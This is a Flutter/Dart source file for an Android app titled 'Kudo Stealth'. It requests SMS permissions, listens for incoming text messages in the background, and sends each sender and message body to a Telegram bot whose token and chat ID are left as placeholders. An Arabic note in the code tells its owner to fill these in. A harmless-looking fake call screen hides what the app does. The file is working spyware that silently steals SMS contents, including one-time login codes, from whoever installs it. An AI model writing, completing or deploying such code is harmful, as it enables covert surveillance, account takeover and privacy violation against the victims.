import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;
import 'dart:async';

void main() => runApp(MaterialApp(home: KudoApp(), debugShowCheckedModeBanner: false, theme: ThemeData.dark()));

class KudoApp extends StatefulWidget {
  @override
  _KudoAppState createState() => _KudoAppState();
}

class _KudoAppState extends State<KudoApp> {
  final Telephony telephony = Telephony.instance;

  @override
  void initState() {
    super.initState();
    _initSms();
  }

  void _initSms() async {
    bool? permissions = await telephony.requestPhoneAndSmsPermissions;
    if (permissions == true) {
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          // حط بياناتك هنا يا كودو
          final url = "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_ID&text=من: ${message.address}\nالرسالة: ${message.body}";
          http.get(Uri.parse(url));
        },
        listenInBackground: true,
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text("Kudo Stealth"), centerTitle: true),
      body: Center(child: Text("النظام يعمل بالخلفية")),
      floatingActionButton: FloatingActionButton(
        child: Icon(Icons.call),
        onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (c) => FakeCall())),
      ),
    );
  }
}

class FakeCall extends StatefulWidget {
  @override
  _FakeCallState createState() => _FakeCallState();
}

class _FakeCallState extends State<FakeCall> {
  int _s = 0;
  Timer? _t;
  @override
  void initState() { super.initState(); _t = Timer.periodic(Duration(seconds: 1), (t) => setState(() => _s++)); }
  @override
  void dispose() { _t?.cancel(); super.dispose(); }
  @override
  Widget build(BuildContext context) {
    return Scaffold(backgroundColor: Colors.black, body: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      Center(child: Icon(Icons.account_circle, size: 150, color: Colors.white24)),
      Text("جاري الاتصال...", style: TextStyle(fontSize: 30, color: Colors.white)),
      Text("${(_s ~/ 60).toString().padLeft(2, '0')}:${(_s % 60).toString().padLeft(2, '0')}", style: TextStyle(fontSize: 20, color: Colors.white54)),
      SizedBox(height: 100),
      FloatingActionButton(backgroundColor: Colors.red, child: Icon(Icons.call_end), onPressed: () => Navigator.pop(context)),
    ]));
  }
}
